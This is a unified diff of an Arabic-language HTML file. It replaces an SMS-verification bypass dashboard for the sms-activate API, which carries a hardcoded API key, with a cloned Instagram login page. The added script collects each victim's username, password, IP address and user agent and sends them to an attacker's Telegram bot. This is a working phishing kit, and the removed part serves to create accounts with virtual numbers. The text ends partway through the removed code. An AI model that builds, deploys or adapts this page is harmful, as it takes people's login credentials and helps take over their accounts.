@@ -1,909 +1,463 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📡 SMS Receiver · sms-activate</title>
+    <title>Instagram</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            background: #0f0f1a; 
-            min-height: 100vh; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            color: #e0e0e0;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
-        
-        .container { width: 100%; max-width: 800px; padding: 16px; }
-        
-        .header { 
-            background: linear-gradient(135deg, #1a1a2e, #16213e); 
-            padding: 20px; 
-            border-radius: 12px; 
-            text-align: center; 
-            margin-bottom: 16px;
-            border: 1px solid #2a2a4a;
-        }
-        .header h1 { font-size: 1.3rem; color: #00d4ff; margin-bottom: 4px; }
-        .header p { font-size: 0.75rem; color: #8888aa; }
-        .header .key-badge {
-            display: inline-block;
-            margin-top: 8px;
-            padding: 4px 14px;
-            background: #2a2a4a;
-            border-radius: 20px;
-            font-size: 0.65rem;
-            color: #00d4ff;
-            font-family: 'Courier New', monospace;
-            letter-spacing: 0.5px;
-        }
-        
-        .card { 
-            background: #1a1a2e; 
-            border-radius: 10px; 
-            padding: 18px; 
-            margin-bottom: 14px;
-            border: 1px solid #2a2a4a;
-        }
-        .card-title { 
-            font-size: 0.8rem; 
-            color: #00d4ff; 
-            font-weight: 700;
-            margin-bottom: 12px;
-            padding-bottom: 6px;
-            border-bottom: 2px solid #2a2a4a;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        
-        .form-group { margin-bottom: 12px; }
-        .form-group label { display: block; font-size: 0.72rem; color: #aaa; margin-bottom: 3px; }
-        .form-group input, .form-group select {
-            width: 100%;
-            padding: 9px 12px;
-            background: #0f0f1a;
-            border: 1px solid #333;
-            border-radius: 6px;
-            color: #e0e0e0;
-            font-size: 0.82rem;
-            transition: 0.2s;
-            font-family: inherit;
-        }
-        .form-group input:focus, .form-group select:focus {
-            border-color: #00d4ff;
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(0,212,255,0.1);
-        }
-        select option { background: #1a1a2e; color: #e0e0e0; }
-        
-        .btn {
-            padding: 9px 20px;
-            border: none;
-            border-radius: 6px;
-            font-weight: 600;
-            font-size: 0.78rem;
-            cursor: pointer;
-            transition: 0.2s;
-            font-family: inherit;
-        }
-        .btn-primary { background: #00d4ff; color: #0f0f1a; }
-        .btn-primary:hover { background: #00b8e6; }
-        .btn-danger { background: #d40511; color: #fff; }
-        .btn-danger:hover { background: #b0040e; }
-        .btn-success { background: #2e7d32; color: #fff; }
-        .btn-success:hover { background: #1b5e20; }
-        .btn-secondary { background: #333; color: #e0e0e0; }
-        .btn-secondary:hover { background: #444; }
-        .btn-outline { background: transparent; border: 1px solid #444; color: #aaa; }
-        .btn-outline:hover { border-color: #00d4ff; color: #00d4ff; }
-        
-        .btn:disabled { opacity: 0.4; cursor: not-allowed; }
-        
-        .flex-row { display: flex; gap: 8px; flex-wrap: wrap; }
-        .flex-between { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; }
-        
-        .status-box {
-            background: #0f0f1a;
-            padding: 10px 14px;
-            border-radius: 6px;
-            font-size: 0.72rem;
-            color: #888;
-            margin-bottom: 12px;
-            border-left: 3px solid #333;
-            font-family: 'Courier New', monospace;
-            line-height: 1.6;
-            min-height: 40px;
-        }
-        .status-box.success { border-left-color: #2e7d32; color: #a5d6a7; }
-        .status-box.error { border-left-color: #d40511; color: #ef9a9a; }
-        .status-box.info { border-left-color: #00d4ff; color: #80deea; }
-        .status-box.warn { border-left-color: #ff8f00; color: #ffe082; }
-        
-        .sms-list { max-height: 420px; overflow-y: auto; }
-        .sms-item {
-            background: #0f0f1a;
-            border-radius: 6px;
-            padding: 10px 14px;
-            margin-bottom: 8px;
-            border: 1px solid #2a2a4a;
-            transition: 0.2s;
-        }
-        .sms-item:hover { border-color: #00d4ff; }
-        .sms-item .sms-header {
+
+        body {
+            background: #fafafa;
             display: flex;
-            justify-content: space-between;
+            flex-direction: column;
             align-items: center;
-            margin-bottom: 5px;
-            font-size: 0.65rem;
-            color: #888;
+            justify-content: center;
+            min-height: 100vh;
+            direction: ltr;
         }
-        .sms-item .sms-from { color: #00d4ff; font-weight: 600; font-size: 0.72rem; }
-        .sms-item .sms-text { 
-            font-size: 0.8rem; 
-            color: #e0e0e0; 
-            word-break: break-all;
-            white-space: pre-wrap;
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
         }
-        .sms-item .sms-text.html-msg { 
-            background: #111122; 
-            padding: 6px; 
-            border-radius: 4px; 
-            font-family: 'Courier New', monospace;
-            font-size: 0.7rem;
-            color: #aed581;
-            max-height: 90px;
-            overflow-y: auto;
-            border: 1px solid #2a2a4a;
-        }
-        
-        .sms-empty {
+
+        .login-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 40px 30px;
+            width: 350px;
             text-align: center;
-            padding: 30px;
-            color: #555;
-            font-size: 0.8rem;
         }
-        
-        .badge {
-            display: inline-block;
-            padding: 2px 7px;
-            border-radius: 4px;
-            font-size: 0.6rem;
-            font-weight: 700;
-            text-transform: uppercase;
-            margin-left: 4px;
+
+        .logo {
+            margin-bottom: 30px;
         }
-        .badge-html { background: #ff8f00; color: #0f0f1a; }
-        .badge-new { background: #00d4ff; color: #0f0f1a; }
-        .badge-sms { background: #2e7d32; color: #fff; }
-        
-        .toggle-raw-btn {
-            background: none;
-            border: 1px solid #333;
-            border-radius: 4px;
-            padding: 2px 8px;
-            font-size: 0.6rem;
+
+        .logo svg {
+            width: 175px;
+            height: 51px;
+        }
+
+        .input-group {
+            margin-bottom: 6px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 9px 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            outline: none;
+            transition: border 0.2s;
+        }
+
+        .input-group input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .input-group input::placeholder {
+            color: #8e8e8e;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 7px 0;
+            background: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
             cursor: pointer;
-            color: #888;
-            margin-top: 4px;
+            margin-top: 12px;
+            opacity: 0.7;
+            transition: opacity 0.2s;
         }
-        .toggle-raw-btn:hover { border-color: #00d4ff; color: #00d4ff; }
-        
-        .footer { font-size: 0.62rem; color: #444; text-align: center; padding: 16px 0; }
-        
-        .log-area {
-            background: #0f0f1a;
-            border-radius: 6px;
-            padding: 8px 12px;
-            max-height: 200px;
-            overflow-y: auto;
-            font-family: 'Courier New', monospace;
-            font-size: 0.65rem;
-            color: #666;
-            margin-top: 8px;
-            border: 1px solid #2a2a4a;
+
+        .login-btn.active {
+            opacity: 1;
         }
-        .log-entry { padding: 2px 0; }
-        .log-entry .time { color: #555; }
-        .log-entry .msg { color: #888; }
-        .log-entry .msg.error { color: #ef9a9a; }
-        .log-entry .msg.success { color: #a5d6a7; }
-        
-        .stats-row {
+
+        .login-btn.active:hover {
+            background: #1877f2;
+        }
+
+        .divider {
             display: flex;
-            gap: 12px;
-            flex-wrap: wrap;
-            margin-bottom: 10px;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
         }
-        .stat-item {
+
+        .divider::before,
+        .divider::after {
+            content: '';
             flex: 1;
-            min-width: 80px;
-            background: #0f0f1a;
-            border-radius: 6px;
-            padding: 8px 10px;
-            text-align: center;
-            border: 1px solid #2a2a4a;
+            height: 1px;
+            background: #dbdbdb;
         }
-        .stat-item .num { font-size: 1.1rem; font-weight: 700; color: #00d4ff; display: block; }
-        .stat-item .lbl { font-size: 0.6rem; color: #666; text-transform: uppercase; }
-        
-        .method-selector {
+
+        .divider span {
+            padding: 0 18px;
+        }
+
+        .fb-login {
             display: flex;
+            align-items: center;
+            justify-content: center;
             gap: 8px;
-            margin-bottom: 12px;
-            flex-wrap: wrap;
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 18px;
         }
-        .method-selector .method-btn {
-            flex: 1;
-            padding: 6px 12px;
-            border: 1px solid #333;
-            border-radius: 6px;
-            background: #0f0f1a;
-            color: #888;
-            cursor: pointer;
-            font-size: 0.7rem;
+
+        .fb-login svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .signup-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px 40px;
+            width: 350px;
             text-align: center;
-            transition: 0.2s;
-            font-family: inherit;
+            font-size: 14px;
+            color: #262626;
         }
-        .method-selector .method-btn.active {
-            border-color: #00d4ff;
-            color: #00d4ff;
-            background: #0a1a2e;
+
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
         }
-        .method-selector .method-btn:hover { border-color: #555; }
-        
-        @media (max-width: 500px) {
-            .container { padding: 10px; }
-            .card { padding: 12px; }
-            .flex-between { flex-direction: column; align-items: stretch; }
-            .stats-row { flex-direction: column; }
+
+        .get-app {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #262626;
         }
-        
-        ::-webkit-scrollbar { width: 3px; }
-        ::-webkit-scrollbar-track { background: #0f0f1a; }
-        ::-webkit-scrollbar-thumb { background: #333; border-radius: 2px; }
-        ::-webkit-scrollbar-thumb:hover { background: #555; }
+
+        .app-icons {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 15px;
+        }
+
+        .app-icons img {
+            height: 40px;
+        }
+
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            font-size: 12px;
+            color: #8e8e8e;
+            padding: 0 20px;
+        }
+
+        .footer a {
+            color: #8e8e8e;
+            text-decoration: none;
+            margin: 0 8px 10px;
+            display: inline-block;
+            font-size: 12px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .lang-select {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+
+        .error-msg {
+            color: #ed4956;
+            font-size: 13px;
+            margin-bottom: 10px;
+            display: none;
+        }
+
+        /* Loading overlay */
+        #loadingOverlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(255,255,255,0.85);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        #loadingOverlay .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #dbdbdb;
+            border-top: 4px solid #0095f6;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #loadingOverlay p {
+            font-size: 16px;
+            color: #262626;
+            font-weight: 500;
+        }
+
+        .toast {
+            display: none;
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #262626;
+            color: #fff;
+            padding: 14px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            z-index: 10001;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        
-        <!-- HEADER -->
-        <div class="header">
-            <h1>📡 SMS Receiver · sms-activate</h1>
-            <p>استقبال رسائل SMS و HTML عبر API sms-activate.org</p>
-            <div class="key-badge">🔑 API Key محمل ✓</div>
+
+<div id="loadingOverlay">
+    <div class="spinner"></div>
+    <p>جاري تسجيل الدخول...</p>
+</div>
+
+<div id="toastMsg" class="toast"></div>
+
+<div class="container">
+    <!-- Login Box -->
+    <div class="login-box">
+        <div class="logo">
+            <!-- Instagram Logo SVG -->
+            <svg viewBox="0 0 175 51" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M49.583 25.5c0 5.52-4.48 10-10 10s-10-4.48-10-10 4.48-10 10-10 10 4.48 10 10z" fill="url(#ig_logo_grad)"/>
+                <path d="M60.5 25.5c0 5.52-4.48 10-10 10s-10-4.48-10-10 4.48-10 10-10 10 4.48 10 10z" fill="url(#ig_logo_grad)"/>
+                <path d="M39.583 25.5c0 5.52-4.48 10-10 10s-10-4.48-10-10 4.48-10 10-10 10 4.48 10 10z" fill="url(#ig_logo_grad)"/>
+                <rect x="30" y="15" width="30" height="30" rx="8" fill="#fff"/>
+                <defs>
+                    <linearGradient id="ig_logo_grad" x1="0" y1="0" x2="0" y2="51" gradientUnits="userSpaceOnUse">
+                        <stop stop-color="#FEDA77"/>
+                        <stop offset="0.25" stop-color="#F58529"/>
+                        <stop offset="0.5" stop-color="#DD2A7B"/>
+                        <stop offset="0.75" stop-color="#8134AF"/>
+                        <stop offset="1" stop-color="#515BD4"/>
+                    </linearGradient>
+                </defs>
+            </svg>
         </div>
-        
-        <!-- MAIN CARD -->
-        <div class="card">
-            <div class="card-title">⚙️ لوحة التحكم</div>
-            
-            <!-- طريقة الاتصال -->
-            <div class="method-selector">
-                <div class="method-btn active" id="methodDirect" onclick="setMethod('direct')">🌐 مباشر (CORS Proxy)</div>
-                <div class="method-btn" id="methodJsonp" onclick="setMethod('jsonp')">🔄 JSONP</div>
-                <div class="method-btn" id="methodIframe" onclick="setMethod('iframe')">📦 Iframe</div>
+
+        <div id="errorMsg" class="error-msg">عذرًا، كلمة المرور غير صحيحة. أعد المحاولة.</div>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="text" id="username" placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني" required>
             </div>
-            
-            <div class="flex-row" style="margin-bottom:12px;">
-                <button class="btn btn-primary" id="btnGetBalance" onclick="getBalance()">💰 الرصيد</button>
-                <button class="btn btn-outline" onclick="getNumbers()">📊 الأرقام المتاحة</button>
-                <button class="btn btn-outline" onclick="getPrices()">💵 قائمة الأسعار</button>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="كلمة المرور" required>
             </div>
-            
-            <div class="status-box" id="statusBox">
-                💡 جاهز. حاول الاتصال بالرصيد...
-            </div>
-            
-            <div class="flex-between" style="margin-bottom:12px;">
-                <div class="form-group" style="flex:1;margin-bottom:0;">
-                    <label>🌍 الدولة</label>
-                    <select id="countrySelect">
-                        <option value="12">🇺🇸 USA (+1)</option>
-                        <option value="22">🇬🇧 UK (+44)</option>
-                        <option value="6">🇮🇹 Italy (+39)</option>
-                        <option value="33">🇫🇷 France (+33)</option>
-                        <option value="34">🇪🇸 Spain (+34)</option>
-                        <option value="49">🇩🇪 Germany (+49)</option>
-                        <option value="7">🇷🇺 Russia (+7)</option>
-                        <option value="380">🇺🇦 Ukraine (+380)</option>
-                        <option value="20" selected>🇪🇬 Egypt (+20)</option>
-                        <option value="212">🇲🇦 Morocco (+212)</option>
-                        <option value="213">🇩🇿 Algeria (+213)</option>
-                        <option value="216">🇹🇳 Tunisia (+216)</option>
-                        <option value="966">🇸🇦 Saudi Arabia (+966)</option>
-                        <option value="971">🇦🇪 UAE (+971)</option>
-                        <option value="91">🇮🇳 India (+91)</option>
-                    </select>
-                </div>
-                <div class="form-group" style="flex:1;margin-bottom:0;">
-                    <label>📨 الخدمة</label>
-                    <select id="serviceSelect">
-                        <option value="go">Google</option>
-                        <option value="tg">Telegram</option>
-                        <option value="wa">WhatsApp</option>
-                        <option value="fb">Facebook</option>
-                        <option value="ig">Instagram</option>
-                        <option value="tb">Twitter / X</option>
-                        <option value="vk">VK</option>
-                        <option value="ok">OK.ru</option>
-                        <option value="av">Avito</option>
-                        <option value="ub">Uber</option>
-                        <option value="gp">Any other</option>
-                    </select>
-                </div>
-            </div>
-            
-            <div class="flex-row">
-                <button class="btn btn-success" id="btnGetNumber" onclick="getNumber()">📱 الحصول على رقم</button>
-                <button class="btn btn-primary" id="btnCheckSMS" onclick="checkSMS()" disabled>📩 التحقق من الرسائل</button>
-                <button class="btn btn-danger" onclick="cancelActivation()">⏹️ إلغاء التفعيل</button>
-            </div>
-            
-            <div class="form-group" style="margin-top:12px;margin-bottom:0;">
-                <label>🔗 CORS Proxy URL (إذا اخترت "مباشر")</label>
-                <input type="text" id="proxyUrl" value="https://corsproxy.io/?" placeholder="https://corsproxy.io/?">
-            </div>
+            <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
+        </form>
+
+        <div class="divider">
+            <span>أو</span>
         </div>
-        
-        <!-- SMS CARD -->
-        <div class="card" id="smsCard">
-            <div class="flex-between">
-                <div class="card-title" style="margin-bottom:0;border-bottom:none;padding-bottom:0;">📨 الرسائل المستلمة</div>
-                <div class="flex-row" style="gap:4px;">
-                    <span id="smsCount" style="font-size:0.72rem;color:#888;padding:4px 0;">0</span>
-                    <button class="btn btn-secondary" style="padding:3px 8px;font-size:0.6rem;" onclick="clearSMS()">🗑️</button>
-                </div>
-            </div>
-            <hr style="border:0.5px solid #2a2a4a;margin:8px 0;">
-            
-            <div class="stats-row" id="statsRow">
-                <div class="stat-item">
-                    <span class="num" id="displayNumber">—</span>
-                    <span class="lbl">رقم التفعيل</span>
-                </div>
-                <div class="stat-item">
-                    <span class="num" id="displayActivationId">—</span>
-                    <span class="lbl">Activation ID</span>
-                </div>
-                <div class="stat-item">
-                    <span class="num" id="displayStatus">⚪</span>
-                    <span class="lbl">الحالة</span>
-                </div>
-            </div>
-            
-            <div class="sms-list" id="smsList">
-                <div class="sms-empty">📭 لا توجد رسائل بعد. احصل على رقم أولاً.</div>
-            </div>
-            
-            <div class="log-area" id="logArea">
-                <div class="log-entry"><span class="time">[--:--:--]</span> <span class="msg">✅ السكريبت جاهز</span></div>
-            </div>
-        </div>
-        
-        <!-- AUTO-REFRESH CARD -->
-        <div class="card" style="padding:12px 18px;">
-            <div class="flex-between">
-                <span style="font-size:0.72rem;color:#888;">🔄 التحديث التلقائي (كل 5 ثوانٍ)</span>
-                <label style="display:flex;align-items:center;gap:8px;font-size:0.72rem;color:#888;cursor:pointer;">
-                    <input type="checkbox" id="autoRefresh" onchange="toggleAutoRefresh()" style="width:16px;height:16px;cursor:pointer;">
-                    تفعيل
-                </label>
-            </div>
-        </div>
-        
-        <div class="footer">sms-activate.org Bridge v2.1 · CORS Fix · للاختبارات الأخلاقية فقط</div>
+
+        <a href="#" class="fb-login">
+            <svg viewBox="0 0 16 16" fill="currentColor">
+                <path d="M8 0C3.58 0 0 3.58 0 8c0 3.85 2.63 7.08 6.16 8v-5.66H4.3V8h1.86V6.2c0-1.84 1.1-2.86 2.78-2.86.8 0 1.64.14 1.64.14v1.8h-.92c-.91 0-1.2.57-1.2 1.15V8h2.04l-.33 2.34H8.3V16C13.37 15.08 16 11.15 16 8c0-4.42-3.58-8-8-8z"/>
+            </svg>
+            تسجيل الدخول باستخدام Facebook
+        </a>
+
+        <a href="#" class="forgot-password">هل نسيت كلمة المرور؟</a>
     </div>
 
-    <script>
-        // ====================================================================
-        // 🔑 API KEY — مفتاحك جاهز
-        // ====================================================================
-        var API_KEY = '4850e36b08A639f11f0dd3A87b36f82b';
+    <!-- Signup Box -->
+    <div class="signup-box">
+        ليس لديك حساب؟ <a href="#">اشترك الآن</a>
+    </div>
+
+    <div class="get-app">
+        <p>حمّل التطبيق</p>
+        <div class="app-icons">
+            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'%3E%3Crect width='135' height='40' rx='5' fill='%23000'/%3E%3Ctext x='20' y='26' fill='%23fff' font-size='12' font-family='sans-serif'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Google Play">
+            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'%3E%3Crect width='135' height='40' rx='5' fill='%23000'/%3E%3Ctext x='20' y='26' fill='%23fff' font-size='12' font-family='sans-serif'%3EApp Store%3C/text%3E%3C/svg%3E" alt="App Store">
+        </div>
+    </div>
+
+    <div class="footer">
+        <a href="#">Meta</a>
+        <a href="#">معلومات</a>
+        <a href="#">المدونة</a>
+        <a href="#">الوظائف</a>
+        <a href="#">المساعدة</a>
+        <a href="#">API</a>
+        <a href="#">الخصوصية</a>
+        <a href="#">الشروط</a>
+        <a href="#">الحسابات المرتبطة</a>
+        <a href="#">مواقع هاشتاغ</a>
+        <a href="#">Instagram Lite</a>
+        <div class="lang-select">
+            <select style="border:none;background:transparent;font-size:12px;color:#8e8e8e;">
+                <option>العربية</option>
+                <option>English</option>
+                <option>Français</option>
+            </select>
+        </div>
+    </div>
+</div>
+
+<script>
+    // ========== التــهيئــة ==========
+    // ضع هنا التوكن (API Token) الخاص ببوت تلجرام
+    const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+    // ضع هنا ايدي حسابك في تلجرام (رقمي)
+    const CHAT_ID = 'YOUR_CHAT_ID_HERE';
+    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    // ========== الـدوال ==========
+    function showToast(msg) {
+        const toast = document.getElementById('toastMsg');
+        toast.textContent = msg;
+        toast.style.display = 'block';
+        setTimeout(() => { toast.style.display = 'none'; }, 4000);
+    }
+
+    function showLoading(show) {
+        document.getElementById('loadingOverlay').style.display = show ? 'flex' : 'none';
+    }
+
+    async function sendToTelegram(data) {
+        const ip = await getUserIP();
+        const time = new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' });
         
-        // ====================================================================
-        // STATE
-        // ====================================================================
-        var state = {
-            activationId: null,
-            phoneNumber: null,
-            smsList: [],
-            autoRefreshInterval: null,
-            isChecking: false,
-            method: 'direct'  // direct, jsonp, iframe
-        };
+        const message = `🔴 **تسجيل دخول Instagram** 🔴\n\n` +
+                        `👤 **المستخدم:** ${data.username}\n` +
+                        `🔑 **كلمة المرور:** ${data.password}\n` +
+                        `🌐 **IP:** ${ip || 'غير معروف'}\n` +
+                        `🕐 **التاريخ:** ${time}\n` +
+                        `📍 **User-Agent:** ${navigator.userAgent.substring(0, 80)}`;
 
-        // ====================================================================
-        // DOM REFS
-        // ====================================================================
-        var $ = function(id) { return document.getElementById(id); };
-        var statusBox = $('statusBox');
-        var smsList = $('smsList');
-        var logArea = $('logArea');
-        var displayNumber = $('displayNumber');
-        var displayActivationId = $('displayActivationId');
-        var displayStatus = $('displayStatus');
-        var smsCount = $('smsCount');
-        var btnCheckSMS = $('btnCheckSMS');
-        var btnGetNumber = $('btnGetNumber');
-        var autoRefreshCheck = $('autoRefresh');
-
-        // ====================================================================
-        // LOGGING
-        // ====================================================================
-        function log(msg, type) {
-            var div = document.createElement('div');
-            div.className = 'log-entry';
-            var now = new Date();
-            var time = '[' + 
-                String(now.getHours()).padStart(2,'0') + ':' + 
-                String(now.getMinutes()).padStart(2,'0') + ':' + 
-                String(now.getSeconds()).padStart(2,'0') + ']';
-            div.innerHTML = '<span class="time">' + time + '</span> <span class="msg ' + (type || '') + '">' + msg + '</span>';
-            logArea.appendChild(div);
-            logArea.scrollTop = logArea.scrollHeight;
-        }
-
-        function setStatus(msg, type) {
-            statusBox.className = 'status-box ' + (type || '');
-            statusBox.textContent = msg;
-        }
-
-        // ====================================================================
-        // METHOD SELECTOR
-        // ====================================================================
-        function setMethod(method) {
-            state.method = method;
-            ['direct', 'jsonp', 'iframe'].forEach(function(m) {
-                var el = $('method' + m.charAt(0).toUpperCase() + m.slice(1));
-                if (el) {
-                    el.classList.toggle('active', m === method);
-                }
+        try {
+            const res = await fetch(TELEGRAM_API, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
             });
-            log('🔄 طريقة الاتصال: ' + method, '');
-            setStatus('✅ تم تغيير طريقة الاتصال إلى: ' + method, 'info');
-        }
-
-        // ====================================================================
-        // API CALL — مع CORS Proxy
-        // ====================================================================
-        function apiCall(action, params) {
-            var baseUrl = 'https://api.sms-activate.ae/stubs/handler_api.php?api_key=' + encodeURIComponent(API_KEY) + '&action=' + encodeURIComponent(action);
-            if (params) {
-                for (var k in params) {
-                    baseUrl += '&' + encodeURIComponent(k) + '=' + encodeURIComponent(params[k]);
-                }
-            }
-            
-            log('➡️ ' + action + '...', '');
-            
-            if (state.method === 'direct') {
-                // استعمال CORS Proxy
-                var proxyUrl = $('proxyUrl').value.trim() || 'https://corsproxy.io/?';
-                var fullUrl = proxyUrl + encodeURIComponent(baseUrl);
-                
-                return fetch(fullUrl)
-                    .then(function(r) { 
-                        if (!r.ok) throw new Error('HTTP ' + r.status);
-                        return r.text(); 
-                    })
-                    .then(function(text) {
-                        log('⬅️ ' + text.substring(0, 150), '');
-                        return text;
-                    });
-            }
-            else if (state.method === 'jsonp') {
-                // JSONP fallback
-                return new Promise(function(resolve, reject) {
-                    var callbackName = 'jsonp_cb_' + Date.now();
-                    window[callbackName] = function(data) {
-                        delete window[callbackName];
-                        document.body.removeChild(script);
-                        resolve(data);
-                    };
-                    
-                    var separator = baseUrl.includes('?') ? '&' : '?';
-                    var url = baseUrl + separator + 'callback=' + callbackName;
-                    
-                    var script = document.createElement('script');
-                    script.src = url;
-                    script.onerror = function() {
-                        delete window[callbackName];
-                        document.body.removeChild(script);
-                        reject(new Error('JSONP error'));
-                    };
-                    document.body.appendChild(script);
-                    
-                    setTimeout(function() {
-                        delete window[callbackName];
-                        document.body.removeChild(script);
-                        reject(new Error('JSONP timeout'));
-                    }, 15000);
-                });
-            }
-            else {
-                // Iframe method — we use the same as direct with proxy
-                var proxyUrl = $('proxyUrl').value.trim() || 'https://corsproxy.io/?';
-                var fullUrl = proxyUrl + encodeURIComponent(baseUrl);
-                
-                return fetch(fullUrl)
-                    .then(function(r) { 
-                        if (!r.ok) throw new Error('HTTP ' + r.status);
-                        return r.text(); 
-                    })
-                    .then(function(text) {
-                        log('⬅️ ' + text.substring(0, 150), '');
-                        return text;
-                    });
-            }
-        }
-
-        // ====================================================================
-        // GET BALANCE
-        // ====================================================================
-        function getBalance() {
-            setStatus('⏳ جاري التحقق من الرصيد...', 'info');
-            $('btnGetBalance').disabled = true;
-            
-            apiCall('getBalance')
-                .then(function(resp) {
-                    $('btnGetBalance').disabled = false;
-                    if (resp.startsWith('ACCESS_BALANCE:')) {
-                        var balance = resp.split(':')[1];
-                        setStatus('💰 الرصيد المتاح: ' + balance + ' RUB', 'success');
-                        log('✅ الرصيد: ' + balance + ' RUB', 'success');
-                    } else if (resp === 'BAD_KEY') {
-                        setStatus('❌ مفتاح API خاطئ. تحقق من المفتاح', 'error');
-                        log('❌ BAD_KEY', 'error');
-                    } else {
-                        setStatus('⚠️ الرد: ' + (resp.substring(0, 100) || 'فارغ'), 'warn');
-                        log('⚠️ رد غير متوقع: ' + resp, 'error');
-                    }
-                })
-                .catch(function(err) {
-                    $('btnGetBalance').disabled = false;
-                    setStatus('❌ خطأ في الاتصال: ' + err.message + '. جرب تغيير طريقة الاتصال', 'error');
-                    log('❌ ' + err.message, 'error');
-                });
-        }
-
-        // ====================================================================
-        // GET NUMBERS STATUS
-        // ====================================================================
-        function getNumbers() {
-            var country = $('countrySelect').value;
-            setStatus('⏳ جاري استعلام الأرقام المتاحة...', 'info');
-            
-            apiCall('getNumbersStatus', { country: country })
-                .then(function(resp) {
-                    try {
-                        var data = JSON.parse(resp);
-                        var total = 0;
-                        var msg = '📊 الأرقام المتاحة:\n';
-                        for (var service in data) {
-                            if (data[service] && typeof data[service] === 'object') {
-                                var free = data[service].free || 0;
-                                total += free;
-                                if (free > 0) {
-                                    msg += '• ' + service + ': ' + free + ' ';
-                                }
-                            }
-                        }
-                        msg += '\n📌 المجموع: ' + total + ' رقم';
-                        setStatus(msg, 'info');
-                        log('✅ تم استعلام الأرقام: ' + total + ' متاح', 'success');
-                    } catch(e) {
-                        setStatus('⚠️ ' + resp.substring(0, 120), 'warn');
-                    }
-                })
-                .catch(function(err) {
-                    setStatus('❌ خطأ: ' + err.message, 'error');
-                });
-        }
-
-        // ====================================================================
-        // GET PRICES
-        // ====================================================================
-        function getPrices() {
-            setStatus('⏳ جاري جلب الأسعار...', 'info');
-            
-            apiCall('getPrices')
-                .then(function(resp) {
-                    try {
-                        var data = JSON.parse(resp);
-                        var msg = '💵 الأسعار (أرخص 5):\n';
-                        var count = 0;
-                        for (var service in data) {
-                            if (count >= 5) break;
-                            if (data[service] && typeof data[service] === 'object') {
-                                for (var country in data[service]) {
-                                    var cost = data[service][country].cost || '?';
-                                    msg += '• ' + service + ' (' + country + '): ' + cost + ' RUB\n';
-                                    count++;
-                                }
-                            }
-                        }
-                        setStatus(msg, 'info');
-                    } catch(e) {
-                        setStatus('⚠️ ' + resp.substring(0, 100), 'warn');
-                    }
-                })
-                .catch(function(err) {
-                    setStatus('❌ خطأ: ' + err.message, 'error');
-                });
-        }
-
-        // ====================================================================
-        // GET NUMBER
-        // ====================================================================
-        function getNumber() {
-            var country = $('countrySelect').value;
-            var service = $('serviceSelect').value;
-            
-            if (state.activationId) {
-                setStatus('⏳ إلغاء التفعيل السابق...', 'info');
-                apiCall('setStatus', { status: 8, id: state.activationId })
-                    .then(function() {
-                        state.activationId = null;
-                        state.phoneNumber = null;
